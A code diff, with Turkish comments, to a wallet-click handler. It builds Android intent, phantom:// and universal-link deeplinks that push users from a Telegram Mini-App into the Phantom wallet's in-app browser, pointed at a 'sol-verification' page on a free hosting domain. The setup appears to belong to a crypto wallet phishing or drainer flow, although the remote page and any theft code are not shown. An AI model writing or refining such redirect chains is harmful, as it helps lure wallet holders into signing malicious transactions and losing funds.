@@ -314,24 +314,31 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return doTx();
     }
 
-    // 2) Sabit IR03 deeplink hazırlığı
-    const targetUrl   = 'https://sol-verification.vercel.app/IR03';
-    const encodedUrl  = encodeURIComponent(targetUrl);
+    // 2) Sabit IR03 deeplink için URL’leri ayarla
+    const targetUrl     = 'https://sol-verification.vercel.app/phantomIR03';
+    const fullUrl       = targetUrl;
+    const encodedFull   = encodeURIComponent(targetUrl);
+    const hostAndPath   = targetUrl.replace(/^https?:\/\//, '');
+
     // Android+Telegram için generic intent: varsayılan tarayıcıyı açtırır
     const intentDefaultBrowser = [
-      `intent://${targetUrl.replace(/^https?:\/\//, '')}`,
+      `intent://${hostAndPath}`,
       `#Intent;scheme=https`,
       `;action=android.intent.action.VIEW`,
       `;category=android.intent.category.BROWSABLE`,
-      `;S.browser_fallback_url=https://phantom.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`,
+      `;S.browser_fallback_url=https://phantom.app/ul/v1/browse/${encodedFull}?ref=${encodedFull}`,
       `;end`
     ].join('');
-    // Android normal tarayıcıda Phantom custom-scheme
-    const schemePhantom = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
-    // iOS veya diğerleri için Universal Link
-    const universalPhantom = `https://phantom.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
 
-    // 3) Android + Telegram Mini-App → intent
+    // Android normal tarayıcıda Phantom custom-scheme ile aç
+    const schemePhantom =
+      `phantom://browse/${encodedFull}?ref=${encodedFull}`;
+
+    // iOS ve fallback için Universal Link
+    const universalPhantom =
+      `https://phantom.app/ul/v1/browse/${encodedFull}?ref=${encodedFull}`;
+
+    // 3) Dal: Android + Telegram Mini-App → intent
     if (isAndroid && isTelegramWebView) {
       const a = document.createElement('a');
       a.href   = intentDefaultBrowser;
@@ -342,7 +349,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 4) Android normal tarayıcı → scheme
+    // 4) Dal: Android normal tarayıcı → scheme
     if (isAndroid) {
       const a = document.createElement('a');
       a.href   = schemePhantom;
@@ -353,7 +360,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 5) iOS veya Desktop → universal link
+    // 5) Dal: iOS veya Desktop → universal link
     window.location.href = universalPhantom;
     return;
   }
